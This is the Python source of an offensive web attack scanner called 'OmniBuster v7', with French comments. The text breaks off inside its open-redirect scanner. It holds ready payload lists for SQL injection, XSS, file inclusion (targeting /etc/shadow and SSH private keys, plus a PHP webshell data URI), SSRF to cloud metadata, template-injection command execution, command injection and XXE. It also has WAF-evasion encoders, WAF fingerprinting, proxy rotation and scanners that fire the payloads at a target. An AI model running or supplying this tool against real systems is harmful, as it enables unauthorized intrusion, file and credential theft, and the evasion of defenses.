#!/usr/bin/env python3
# OmniBuster v7 - By Emerick-19
# Framework offensif modulaire tout-en-un

import argparse
import asyncio
import base64
import csv
import html
import json
import os
import random
import re
import shutil
import signal
import string
import subprocess
import sys
import tempfile
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from typing import List, Optional, Tuple, Set, Dict, Any
from urllib.parse import urljoin, urlparse, quote

import aiohttp
from tqdm.asyncio import tqdm

try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
    C_GREEN, C_YELLOW, C_RED, C_CYAN = Fore.GREEN, Fore.YELLOW, Fore.RED, Fore.CYAN
    C_MAGENTA, C_BLUE, C_BOLD, C_END = Fore.MAGENTA, Fore.BLUE, Style.BRIGHT, Style.RESET_ALL
except ImportError:
    C_GREEN = C_YELLOW = C_RED = C_CYAN = C_MAGENTA = C_BLUE = C_BOLD = C_END = ""

# ===========================================================================
# SECTION 1 : ENCODEURS
# ===========================================================================

def random_case(s, ratio=0.5):
    return "".join(c.upper() if random.random() < ratio else c.lower() for c in s)

def insert_random_comments(s, token="/**/"):
    for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY", "SLEEP"]:
        s = s.replace(kw, token + kw + token)
    return s

def url_encode_deep(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

def url_encode_partial(s, ratio=0.5):
    out = []
    for c in s:
        if c.isalnum() and random.random() > ratio:
            out.append(c)
        else:
            out.append(f"%{ord(c):02X}")
    return "".join(out)

def html_entity_encode(s):
    return "".join(f"&#{ord(c)};" for c in s)

def js_unicode_encode(s):
    return "".join(f"\\u{ord(c):04x}" for c in s)

# ===========================================================================
# SECTION 2 : PAYLOAD FACTORY
# ===========================================================================

class PayloadFactory:
    SQLI_BASE = [
        "'", "\"", "')", "\"))", "' OR '1", "' AND '1",
        "1' AND 1=1-- -", "1' AND 1=2-- -", "1 AND 1=1", "1 AND 1=2",
        "1' UNION SELECT NULL-- -", "1' UNION SELECT NULL,NULL-- -",
        "1 UNION SELECT NULL,NULL,NULL-- -", "-1 UNION SELECT 1,2,3-- -",
        "1' AND SLEEP(5)-- -", "1' AND (SELECT SLEEP(5))-- -",
        "1'; WAITFOR DELAY '0:0:5'-- -", "1' AND pg_sleep(5)-- -",
        "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
        "admin'-- -", "admin'#", "' OR 'x'='x", "' OR 1=1 LIMIT 1-- -",
    ]
    XSS_BASE = [
        "<script>alert(1)</script>", "<ScRiPt>alert(1)</sCrIpT>",
        "\" onmouseover=\"alert(1)", "' onmouseover='alert(1)",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "<svg/onload=alert(1)>", "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>", "<img/src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "javascript:alert(1)//", "<script>alert`1`</script>",
        "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E",
    ]
    LFI_BASE = [
        "../../../../etc/passwd", "../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "../../../../etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
        "expect://id", "/var/log/apache2/access.log",
        "/proc/self/environ", "/proc/self/cmdline",
        "C:\\Windows\\win.ini", "/etc/shadow", "/root/.ssh/id_rsa",
        "/var/www/html/config.php",
    ]
    SSRF_BASE = [
        "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
        "http://0177.0.0.1/", "http://2130706433/", "http://0x7f000001/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
    ]
    OPEN_REDIRECT_BASE = [
        "//evil.com", "///evil.com", "https://evil.com",
        "http://evil.com", "//google.com@evil.com",
        "////evil.com", "/\\evil.com", "%2F%2Fevil.com",
    ]
    SSTI_BASE = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
        "{{7*'7'}}", "{{config}}", "{{self.__class__.__mro__}}",
        "@(7*7)", "~{7*7}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]
    SSTI_SIGNATURES = [r"\b49\b", r"<class '", r"<type '", r"__mro__", r"<Config"]
    CMDI_BASE = [
        ";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)",
        ";cat /etc/passwd", "|cat /etc/passwd",
        "%0aid", "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)",
        "; ping -c 2 127.0.0.1", "| whoami", "& whoami",
    ]
    CMDI_SIGNATURES = [r"uid=\d+", r"gid=\d+", r"root:.*:0:0:", r"nt authority", r"volume serial"]
    CRLF_BASE = [
        "%0d%0aInjected-Header: value",
        "%0d%0a%0d%0a<html>injected</html>",
        "\r\nInjected: value",
        "%E5%98%8A%E5%98%8DInjected: value",
    ]
    XXE_BASE = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>',
    ]
    XXE_SIGNATURES = [r"root:.*:0:0:", r"\[boot loader\]"]
    SENSITIVE_PATHS = [
        ".git/config", ".git/HEAD", ".svn/entries", ".env", ".env.bak",
        ".env.local", ".env.production", "config.php.bak", "config.php~",
        "wp-config.php.bak", "backup.sql", "backup.zip", "backup.tar.gz",
        "database.sql", "dump.sql", "id_rsa", ".ssh/id_rsa",
        "web.config", "web.config.bak", "Dockerfile", "docker-compose.yml",
        ".htaccess", ".htpasswd", "phpinfo.php", "info.php", "test.php",
        "admin.php", "administrator.php", "console", "shell.php",
        "server-status", "server-info", ".DS_Store", "Thumbs.db",
        "package.json", "composer.json", ".npmrc", ".gitlab-ci.yml",
        "jenkins.xml", "crossdomain.xml", "clientaccesspolicy.xml",
        "sitemap.xml", "robots.txt", "security.txt", ".well-known/security.txt",
        "actuator", "actuator/env", "actuator/health", "actuator/beans",
        "swagger.json", "swagger-ui.html", "api-docs", "openapi.json",
    ]
    HTTP_VERBS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
                  "TRACE", "TRACK", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL"]
    COOKIE_SECURE_FLAGS = ["Secure", "HttpOnly", "SameSite"]

    @classmethod
    def _obfuscate_sqli(cls, base):
        out = []
        for p in base:
            out += [random_case(p), insert_random_comments(p),
                    p.replace(" ", "/**/"), p.replace(" ", "\t"),
                    url_encode_partial(p), url_encode_deep(p)]
        return out

    @classmethod
    def _obfuscate_xss(cls, base):
        out = []
        for p in base:
            out += [random_case(p), p.replace(" ", "/**/"),
                    p.replace("alert", "confirm"), p.replace("alert", "prompt"),
                    url_encode_partial(p), html_entity_encode(p),
                    js_unicode_encode(p)]
        return out

    @classmethod
    def _obfuscate_lfi(cls, base):
        out = []
        for p in base:
            out += [p.replace("../", "....//"), p.replace("../", "..%2f"),
                    p.replace("../", "%2e%2e%2f"), p.replace("../", "..%252f"),
                    url_encode_partial(p), url_encode_deep(p),
                    p + "%00", p + "?", p + "#"]
        return out

    @classmethod
    def sqli(cls, count=20, obfuscate=True):
        payloads = list(cls.SQLI_BASE)
        if obfuscate:
            payloads += cls._obfuscate_sqli(random.sample(cls.SQLI_BASE, min(10, len(cls.SQLI_BASE))))
        random.shuffle(payloads)
        return payloads[:count]

    @classmethod
    def xss(cls, count=25, obfuscate=True):
        payloads = list(cls.XSS_BASE)
        if obfuscate:
            payloads += cls._obfuscate_xss(random.sample(cls.XSS_BASE, min(10, len(cls.XSS_BASE))))
        random.shuffle(payloads)
        return payloads[:count]

    @classmethod
    def lfi(cls, count=30, obfuscate=True):
        payloads = list(cls.LFI_BASE)
        if obfuscate:
            payloads += cls._obfuscate_lfi(random.sample(cls.LFI_BASE, min(10, len(cls.LFI_BASE))))
        random.shuffle(payloads)
        return payloads[:count]

    @classmethod
    def ssrf(cls): return list(cls.SSRF_BASE)
    @classmethod
    def open_redirect(cls): return list(cls.OPEN_REDIRECT_BASE)
    @classmethod
    def ssti(cls): return list(cls.SSTI_BASE)
    @classmethod
    def cmdi(cls): return list(cls.CMDI_BASE)
    @classmethod
    def crlf(cls): return list(cls.CRLF_BASE)
    @classmethod
    def xxe(cls): return list(cls.XXE_BASE)

# ===========================================================================
# SECTION 3 : SIGNATURES
# ===========================================================================

SQLI_ERROR_SIGNATURES = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
    r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result", r"ORA-[0-9]{5}", r"Oracle error",
    r"Microsoft OLE DB Provider for ODBC Drivers", r"Microsoft Access Driver",
    r"JET Database Engine", r"Access Database Engine", r"SQLite/JDBCDriver",
    r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
    r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
    r"You have an error in your SQL syntax",
    r"Unclosed quotation mark after the character string",
]
LFI_SIGNATURES = [r"root:.*:0:0:", r"\[boot loader\]", r"\[fonts\]", r"daemon:.*:/usr/sbin"]
WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
    "AWS WAF": ["awselb", "x-amzn-requestid", "x-amz-cf-id"],
    "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
    "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "sucuri/cloudproxy"],
    "Akamai": ["akamai", "x-akamai", "akamaighost"],
    "Imperva": ["incap_ses", "visid_incap", "x-iinfo"],
    "F5 BIG-IP": ["bigip", "x-wa-info"],
    "Barracuda": ["barra_counter_session", "barracuda"],
    "Fastly": ["fastly", "x-served-by", "x-cache"],
    "Wordfence": ["wordfence", "wfvt_"],
}
SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Content-Type-Options": "medium",
    "X-Frame-Options": "medium",
    "X-XSS-Protection": "low",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
}

# ===========================================================================
# SECTION 4 : CONFIG & STRUCTURES
# ===========================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]
DEFAULT_MATCH_CODES = {200, 204, 301, 302, 307, 401, 403}

@dataclass
class ScanConfig:
    target: str = ""
    concurrency: int = 50
    timeout: int = 5
    retries: int = 2
    match_codes: Set[int] = field(default_factory=lambda: set(DEFAULT_MATCH_CODES))
    exclude_codes: Set[int] = field(default_factory=set)
    filter_size: Optional[int] = None
    filter_words: Optional[int] = None
    filter_lines: Optional[int] = None
    filter_regex: Optional[str] = None
    extensions: List[str] = field(default_factory=list)
    proxy: Optional[str] = None
    proxy_file: Optional[str] = None
    follow_redirects: bool = False
    recursion_depth: int = 0
    output_file: Optional[str] = None
    output_format: str = "txt"
    html_report: Optional[str] = None
    extra_headers: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    rate_limit: float = 0.0
    obfuscation: str = "medium"
    random_delay: bool = False
    spoof_headers: bool = True
    use_sqlmap: bool = False
    resume_file: Optional[str] = None
    targets_file: Optional[str] = None
    http2: bool = False
    use_nuclei: bool = False
    nuclei_templates: Optional[str] = None
    use_dalfox: bool = False
    dalfox_args: Optional[str] = None

@dataclass
class ScanResult:
    url: str
    status: int
    size: int
    words: int
    lines: int
    redirect: Optional[str] = None
    duration: float = 0.0
    extra: dict = field(default_factory=dict)

# ===========================================================================
# SECTION 5 : PROXY POOL
# ===========================================================================

class ProxyPool:
    def __init__(self, proxy=None, proxy_file=None):
        self.proxies = []
        if proxy:
            self.proxies.append(proxy)
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if not line.startswith(("http://", "https://", "socks")):
                            line = "http://" + line
                        self.proxies.append(line)
        self._index = 0

    def next(self):
        if not self.proxies:
            return None
        p = self.proxies[self._index % len(self.proxies)]
        self._index += 1
        return p

    def __bool__(self):
        return bool(self.proxies)

# ===========================================================================
# SECTION 6 : CHECKPOINT
# ===========================================================================

class Checkpoint:
    def __init__(self, path):
        self.path = path
        self.data = self._load()
        self._dirty = False

    def _load(self):
        if os.path.exists(self.path):
            try:
                with open(self.path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except (json.JSONDecodeError, OSError):
                return {}
        return {}

    def mark_done(self, key):
        self.data.setdefault("done", []).append(key)
        self._dirty = True
        if len(self.data["done"]) % 50 == 0:
            self.flush()

    def flush(self):
        if not self._dirty:
            return
        try:
            tmp = self.path + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(self.data, f, indent=2, default=str)
            os.replace(tmp, self.path)
            self._dirty = False
        except OSError:
            pass

# ===========================================================================
# SECTION 7 : HTTP CLIENT
# ===========================================================================

class HTTPClient:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.sem = asyncio.Semaphore(config.concurrency)
        self.session: Optional[aiohttp.ClientSession] = None
        self._last_request = 0.0
        self._ua_index = 0
        self.proxy_pool = ProxyPool(config.proxy, config.proxy_file)

    async def __aenter__(self):
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        if self.config.spoof_headers:
            parsed = urlparse(self.config.target if self.config.target.startswith("http")
                              else f"http://{self.config.target}")
            origin = f"{parsed.scheme}://{parsed.netloc}"
            headers.update({
                "Referer": origin + "/",
                "Origin": origin,
                "X-Requested-With": "XMLHttpRequest",
            })
        headers.update(self.config.extra_headers)
        connector = aiohttp.TCPConnector(ssl=False, limit=self.config.concurrency * 2)
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        self.session = aiohttp.ClientSession(
            connector=connector, timeout=timeout,
            cookies=self.config.cookies or None,
        )
        self._default_headers = headers
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    def _next_ua(self):
        ua = USER_AGENTS[self._ua_index % len(USER_AGENTS)]
        self._ua_index += 1
        return ua

    async def _rate_limit(self):
        delay = self.config.rate_limit
        if self.config.random_delay:
            delay = random.uniform(0.1, 1.5)
        if delay > 0:
            elapsed = time.monotonic() - self._last_request
            if elapsed < delay:
                await asyncio.sleep(delay - elapsed)
            self._last_request = time.monotonic()

    async def request(self, method, url, headers=None, data=None, params=None,
                      allow_redirects=None, read_body=False, cookies=None,
                      json_data=None, http2=None):
        async with self.sem:
            await self._rate_limit()
            start = time.monotonic()
            merged = dict(self._default_headers)
            merged["User-Agent"] = self._next_ua()
            if headers:
                merged.update(headers)

            for attempt in range(self.config.retries + 1):
                try:
                    if allow_redirects is None:
                        allow_redirects = self.config.follow_redirects
                    proxy = self.proxy_pool.next() if self.proxy_pool else None
                    kwargs = {
                        "headers": merged,
                        "allow_redirects": allow_redirects,
                        "proxy": proxy,
                        "cookies": cookies,
                    }
                    if json_data is not None:
                        kwargs["json"] = json_data
                    else:
                        kwargs["data"] = data
                        kwargs["params"] = params
                    if http2 if http2 is not None else self.config.http2:
                        kwargs["version"] = aiohttp.HttpVersion20

                    async with self.session.request(method, url, **kwargs) as resp:
                        body = await resp.read() if read_body else b""
                        text = body.decode("utf-8", errors="ignore")
                        duration = time.monotonic() - start
                        return ScanResult(
                            url=str(resp.url),
                            status=resp.status,
                            size=len(body) if read_body else int(resp.headers.get("Content-Length", 0) or 0),
                            words=len(text.split()) if read_body else 0,
                            lines=text.count("\n") if read_body else 0,
                            redirect=resp.headers.get("Location"),
                            duration=duration,
                            extra={
                                "body": text,
                                "headers": dict(resp.headers),
                                "cookies": dict(resp.cookies),
                            } if read_body else {
                                "headers": dict(resp.headers),
                                "cookies": dict(resp.cookies),
                            },
                        )
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    if attempt < self.config.retries:
                        await asyncio.sleep(0.3 * (attempt + 1))
                        continue
                    return None
                except Exception:
                    return None
        return None

# ===========================================================================
# SECTION 8 : WILDCARD & WAF
# ===========================================================================

async def detect_wildcard(client, base_url):
    rand_path = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
    url = f"{base_url.rstrip('/')}/{rand_path}"
    res = await client.request("GET", url, read_body=True, allow_redirects=False)
    if res and res.status in DEFAULT_MATCH_CODES:
        return (res.status, res.size)
    return None

async def detect_waf(client, url):
    detected = []
    res = await client.request("GET", url, read_body=True, allow_redirects=True)
    if not res:
        return detected
    headers = res.extra.get("headers", {})
    body = res.extra.get("body", "").lower()
    header_str = " ".join(f"{k}:{v}".lower() for k, v in headers.items())
    for waf, sigs in WAF_SIGNATURES.items():
        if any(sig.lower() in header_str or sig.lower() in body for sig in sigs):
            detected.append(waf)
    test_url = url + ("&" if "?" in url else "?") + "waf_test=<script>alert(1)</script>"
    test_res = await client.request("GET", test_url, read_body=True, allow_redirects=False)
    if test_res and test_res.status in (403, 406, 419, 501, 503) and not detected:
        detected.append("Unknown WAF")
    return detected

# ===========================================================================
# SECTION 9 : FILTRAGE & REPORTING
# ===========================================================================

def should_report(res, config, wildcard):
    if not res: return False
    if res.status not in config.match_codes: return False
    if res.status in config.exclude_codes: return False
    if config.filter_size is not None and res.size == config.filter_size: return False
    if config.filter_words and res.words == config.filter_words: return False
    if config.filter_lines and res.lines == config.filter_lines: return False
    if config.filter_regex and re.search(config.filter_regex, res.extra.get("body", "")): return False
    if wildcard and res.status == wildcard[0] and res.size == wildcard[1]: return False
    return True

class Reporter:
    def __init__(self, config):
        self.config = config
        self.results = []
        self.findings = []
        self.start_time = time.monotonic()
        self._init_output()

    def _init_output(self):
        if self.config.output_file:
            try:
                with open(self.config.output_file, "w", encoding="utf-8"): pass
            except OSError as e:
                print(f"{C_RED}[-] Impossible d'ouvrir {self.config.output_file}: {e}{C_END}")
                self.config.output_file = None

    def report(self, res, prefix=""):
        self.results.append(res)
        color = C_GREEN if res.status == 200 else C_YELLOW
        redirect_info = f" -> {C_CYAN}{res.redirect}{C_END}" if res.redirect else ""
        print(f"{prefix}{color}[{res.status}]{C_END} {res.url} "
              f"({C_BLUE}{res.size}b{C_END}/{res.words}w/{res.lines}l) "
              f"[{res.duration:.2f}s]{redirect_info}")
        self._write_result(res)

    def report_finding(self, category, detail, severity="info", url=""):
        color = {"info": C_CYAN, "low": C_YELLOW, "medium": C_MAGENTA,
                 "high": C_RED, "critical": C_RED + C_BOLD}.get(severity, C_CYAN)
        finding = {"category": category, "detail": detail, "severity": severity,
                   "url": url, "time": time.time()}
        self.findings.append(finding)
        url_str = f" [{url}]" if url else ""
        print(f"{color}[{category.upper()}]{C_END} {detail}{url_str}")
        if self.config.output_file:
            try:
                with open(self.config.output_file, "a", encoding="utf-8") as f:
                    f.write(f"FINDING\t{category}\t{severity}\t{url}\t{detail}\n")
            except OSError:
                pass

    def _write_result(self, res):
        if not self.config.output_file: return
        try:
            with open(self.config.output_file, "a", encoding="utf-8") as f:
                if self.config.output_format == "json":
                    f.write(json.dumps(asdict(res), default=str) + "\n")
                elif self.config.output_format == "csv":
                    csv.writer(f).writerow([res.url, res.status, res.size, res.words, res.lines, res.redirect or ""])
                else:
                    f.write(f"{res.status}\t{res.url}\t{res.size}\t{res.words}\t{res.lines}\n")
        except OSError:
            pass

    def summary(self):
        elapsed = time.monotonic() - self.start_time
        print(f"\n{C_MAGENTA}{C_BOLD}=== Scan terminé ==={C_END}")
        print(f"Requêtes     : {len(self.results)}")
        print(f"Findings     : {len(self.findings)}")
        print(f"Durée        : {elapsed:.2f}s")
        if self.config.output_file:
            print(f"Sortie       : {self.config.output_file}")
        if self.config.html_report:
            self._write_html_report()
            print(f"Rapport HTML : {self.config.html_report}")

    def _write_html_report(self):
        sev_colors = {"critical": "#8b0000", "high": "#d9534f",
                      "medium": "#f0ad4e", "low": "#5bc0de", "info": "#5cb85c"}
        rows = ""
        order = ["info", "low", "medium", "high", "critical"]
        for f in sorted(self.findings, key=lambda x: order.index(x["severity"]), reverse=True):
            rows += f"""<tr style="background:{sev_colors.get(f['severity'], '#fff')};color:#fff">
                <td>{f['severity'].upper()}</td><td>{html.escape(f['category'])}</td>
                <td>{html.escape(f['url'])}</td><td>{html.escape(f['detail'])}</td></tr>"""
        content = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>OmniBuster Report</title>
<style>body{{font-family:Arial;margin:20px}}table{{border-collapse:collapse;width:100%}}
td,th{{border:1px solid #ccc;padding:6px}}th{{background:#333;color:#fff}}</style>
</head><body><h1>OmniBuster v7 — Rapport</h1>
<p><b>Target :</b> {html.escape(self.config.target)}</p>
<p><b>Requêtes :</b> {len(self.results)} | <b>Findings :</b> {len(self.findings)}</p>
<table><tr><th>Sévérité</th><th>Catégorie</th><th>URL</th><th>Détail</th></tr>
{rows}</table></body></html>"""
        try:
            with open(self.config.html_report, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError as e:
            print(f"{C_RED}[-] Erreur HTML: {e}{C_END}")

# ===========================================================================
# SECTION 10 : WORDLIST
# ===========================================================================

def load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"{C_RED}[-] Wordlist introuvable: {path}{C_END}")
        sys.exit(1)

# ===========================================================================
# SECTION 11 : SCAN DIRECTORY
# ===========================================================================

async def scan_directory(client, config, reporter, wordlist, base_url, wildcard, depth=0):
    tasks = []
    def build_urls(word):
        clean = word.lstrip("/")
        urls = [urljoin(base_url + "/", clean)]
        if config.extensions and "." not in clean.split("/")[-1]:
            for ext in config.extensions:
                urls.append(urljoin(base_url + "/", f"{clean}.{ext.lstrip('.')}"))
        return urls

    for word in wordlist:
        for url in build_urls(word):
            tasks.append((word, url))

    async def worker(word, url):
        res = await client.request("GET", url, read_body=True, allow_redirects=False)
        if res and should_report(res, config, wildcard):
            reporter.report(res)
            if depth < config.recursion_depth and res.status in (200, 301, 302, 307):
                if not url.endswith("/") and res.status in (301, 302):
                    new_base = url + "/"
                elif url.endswith("/"):
                    new_base = url
                else:
                    return
                if new_base.count("/") > base_url.count("/"):
                    await scan_directory(client, config, reporter, wordlist, new_base, wildcard, depth + 1)

    with tqdm(total=len(tasks), desc=f"Dir(d={depth})", unit="req") as pbar:
        for coro in asyncio.as_completed([worker(w, u) for w, u in tasks]):
            await coro
            pbar.update(1)

# ===========================================================================
# SECTION 12 : SUB / VHOST / HEADER
# ===========================================================================

async def scan_subdomains(client, config, reporter, wordlist):
    parsed = urlparse(config.target if config.target.startswith("http") else f"http://{config.target}")
    base_host = parsed.hostname
    scheme = parsed.scheme or "http"
    async def worker(sub):
        sub = sub.strip().lower()
        if not sub: return
        url = f"{scheme}://{sub}.{base_host}"
        res = await client.request("GET", url, read_body=False, allow_redirects=True)
        if res and res.status in DEFAULT_MATCH_CODES:
            reporter.report(res, prefix=f"{C_GREEN}[SUB]{C_END} ")
    with tqdm(total=len(wordlist), desc="Sub", unit="req") as pbar:
        for coro in asyncio.as_completed([worker(w) for w in wordlist]):
            await coro; pbar.update(1)

async def scan_vhosts(client, config, reporter, wordlist, baseline_size):
    parsed = urlparse(config.target if config.target.startswith("http") else f"http://{config.target}")
    host = parsed.hostname
    async def worker(sub):
        sub = sub.strip().lower()
        if not sub: return
        res = await client.request("GET", config.target, headers={"Host": f"{sub}.{host}"},
                                   read_body=True, allow_redirects=False)
        if res and res.status not in (404,) and res.size != baseline_size:
            reporter.report(res, prefix=f"{C_GREEN}[VHOST]{C_END} ")
    with tqdm(total=len(wordlist), desc="VHost", unit="req") as pbar:
        for coro in asyncio.as_completed([worker(w) for w in wordlist]):
            await coro; pbar.update(1)

HEADER_TEMPLATES = [
    "X-Forwarded-For: {payload}", "X-Forwarded-Host: {payload}",
    "X-Real-IP: {payload}", "X-Client-IP: {payload}",
    "X-Originating-IP: {payload}", "X-Remote-IP: {payload}",
    "X-Remote-Addr: {payload}", "Client-IP: {payload}",
    "Forwarded: for={payload}",
]

async def scan_headers(client, config, reporter, wordlist, baseline_size):
    async def worker(word):
        for template in HEADER_TEMPLATES:
            name, _, value = template.format(payload=word.strip()).partition(":")
            res = await client.request("GET", config.target, headers={name.strip(): value.strip()},
                                       read_body=True, allow_redirects=False)
            if res and res.size != baseline_size and res.status not in (404,):
                reporter.report(res, prefix=f"{C_GREEN}[HEADER {name.strip()}]{C_END} ")
    with tqdm(total=len(wordlist), desc="Headers", unit="req") as pbar:
        for coro in asyncio.as_completed([worker(w) for w in wordlist]):
            await coro; pbar.update(1)

# ===========================================================================
# SECTION 13 : SCANNERS DE VULNÉRABILITÉS
# ===========================================================================

def get_payload_count(level):
    return {"low": 15, "medium": 40, "high": 80}.get(level, 40)

def build_url_with_param(base_url, param, value):
    sep = "&" if "?" in base_url else "?"
    return f"{base_url}{sep}{param}={quote(value, safe='')}"

async def scan_sqli(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    count = get_payload_count(config.obfuscation)
    obfuscate = config.obfuscation in ("medium", "high")
    async def test_param(param):
        normal = await client.request("GET", build_url_with_param(base_url, param, "1"),
                                      read_body=True, allow_redirects=False)
        if not normal: return
        t0 = time.monotonic()
        await client.request("GET", build_url_with_param(base_url, param, "1"),
                             read_body=True, allow_redirects=False)
        nt = time.monotonic() - t0
        for payload in PayloadFactory.sqli(count=count, obfuscate=obfuscate):
            t0 = time.monotonic()
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            elapsed = time.monotonic() - t0
            if not res: continue
            body = res.extra.get("body", "")
            for sig in SQLI_ERROR_SIGNATURES:
                if re.search(sig, body, re.IGNORECASE):
                    reporter.report_finding("SQLi-error",
                        f"param={param} payload={payload!r}", "high", res.url)
                    break
            if any(k in payload.upper() for k in ["SLEEP", "WAITFOR", "PG_SLEEP"]) \
               and elapsed > nt + 2.5:
                reporter.report_finding("SQLi-time",
                    f"param={param} payload={payload!r} -> {elapsed:.2f}s", "high", res.url)
    with tqdm(total=len(params), desc="SQLi", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_xss(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    count = get_payload_count(config.obfuscation)
    obfuscate = config.obfuscation in ("medium", "high")
    async def test_param(param):
        for payload in PayloadFactory.xss(count=count, obfuscate=obfuscate):
            marker = "".join(random.choices(string.ascii_letters, k=8))
            inject = f"{marker}{payload}"
            res = await client.request("GET", build_url_with_param(base_url, param, inject),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            if payload in body and marker in body:
                reporter.report_finding("XSS-reflected",
                    f"param={param} payload={payload!r}", "medium", res.url)
                break
    with tqdm(total=len(params), desc="XSS", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_lfi(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    count = get_payload_count(config.obfuscation)
    obfuscate = config.obfuscation in ("medium", "high")
    async def test_param(param):
        for payload in PayloadFactory.lfi(count=count, obfuscate=obfuscate):
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            for sig in LFI_SIGNATURES:
                if re.search(sig, body):
                    reporter.report_finding("LFI",
                        f"param={param} payload={payload!r}", "critical", res.url)
                    return
    with tqdm(total=len(params), desc="LFI", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_ssrf(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    indicators = ["root:", "ami-id", "instance-id", "connection refused", "redis"]
    async def test_param(param):
        for payload in PayloadFactory.ssrf():
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "").lower()
            for sig in indicators:
                if sig in body:
                    reporter.report_finding("SSRF",
                        f"param={param} payload={payload!r}", "high", res.url)
                    return
    with tqdm(total=len(params), desc="SSRF", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_open_redirect(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    async def test_param(param):
        for payload in PayloadFactory.open_redirect():
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
